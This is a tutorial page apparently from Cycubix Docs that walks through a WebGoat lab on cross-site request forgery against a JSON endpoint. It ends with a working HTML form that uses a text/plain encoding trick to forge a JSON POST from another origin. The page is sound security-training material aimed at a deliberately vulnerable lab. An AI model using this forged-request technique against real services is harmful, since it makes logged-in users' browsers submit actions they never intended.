---
title: "A10:2021 | Server Side Request Forgery | Cross Site Request Forgery (7) | Cycubix Docs"
layout: default
nav_order: 7
parent: "A10:2021 | Server Side Request Forgery | Cross Site Request Forgery | Cycubix Docs"
grand_parent: "A10: 2021 | Server Side Request Forgery | Cycubix Docs"
---
# A10:2021 | Server Side Request Forgery | Cross Site Request Forgery (7) | Cycubix Docs

### CSRF and content-type <a href="#csrf_and_content_type" id="csrf_and_content_type"></a>

In the previous section we saw how relying on the content-type is not a protection against CSRF. In this section we will look into another way we can perform a CSRF attack against a APIs which are not protected against CSRF.

In this assignment you need to achieve to POST the following JSON message to our endpoints:

```
POST /csrf/feedback/message HTTP/1.1

{
  "name"    : "WebGoat",
  "email"   : "webgoat@webgoat.org",
  "content" : "WebGoat is the best!!"
}
```

More information can be found [here](http://pentestmonkey.net/blog/csrf-xml-post-request)

Remember you need to make the call from another origin (WebWolf can help here) and you need to be logged in into WebGoat.

<figure><img src="../../../../../.gitbook/assets/csrf 2.png" alt=""><figcaption></figcaption></figure>

**Solution**

* Open ZAP and intercept the request. 

<figure><img src="../../../../../.gitbook/assets/request intercepted.png" alt=""><figcaption></figcaption></figure>

* When we send the request, WebGoat replies that the solution is not correct. This is because the form submitted should be in JSON format. 
* We will need to create an HTML form that sends the data in JSON format. 
* To create a correct html form we need to create a valid JSON payload. For this we will use enctype="text/plain", which forces the browser to send the form data as plain text, without URL encoding. We will also need to format the form fields to create a JSON payload. 

```
<form enctype="text/plain" method="POST" action="http://192.168.56.104:8080/WebGoat/csrf/feedback/message">
	<input type="hidden" name='{"name": "WebGoat", "email": "webgoat@webgoat.org", "content": "WebGoat is the best!!", "ignoreme":"' value='sdfsdfdf"}'>
	<button>submit</button>
</form>
```

* Save the HTML. Upload to WebWolf. Click Submit and you will get the flag value. 
